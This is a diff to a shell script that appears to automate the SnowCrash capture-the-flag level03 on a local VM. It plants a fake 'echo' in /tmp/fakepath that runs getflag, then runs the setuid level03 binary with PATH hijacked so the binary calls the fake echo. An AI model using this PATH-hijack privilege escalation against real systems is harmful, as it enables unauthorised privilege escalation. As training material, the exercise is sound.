@@ -149,7 +149,7 @@ main() {
     # assert_docker;
 
     host="localhost";
-    port="4242";
+    port="4242"; # cf. port forwarding to VM 4242 => 4242.
 
     level03_socket_path=$(get_ssh_socket_path "snowcrash_level03_socket") || exit 1;
     level03_username="level03";
@@ -159,7 +159,7 @@ main() {
     init_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username" "$level03_password" || exit 1;
     fakepath_dir="/tmp/fakepath";
     ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "mkdir -p \"$fakepath_dir\"";
-    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "echo "getflag" > \"$fakepath_dir/echo\" && chmod +x \"$fakepath_dir/echo\"";
+    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "echo "/bin/getflag" > \"$fakepath_dir/echo\" && chmod +x \"$fakepath_dir/echo\"";
     checkflag=$(ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "PATH=$fakepath_dir:$PATH /home/user/level03/level03" | head -n 1 | awk '{print $NF}');
     kill -USR1 $$;
 
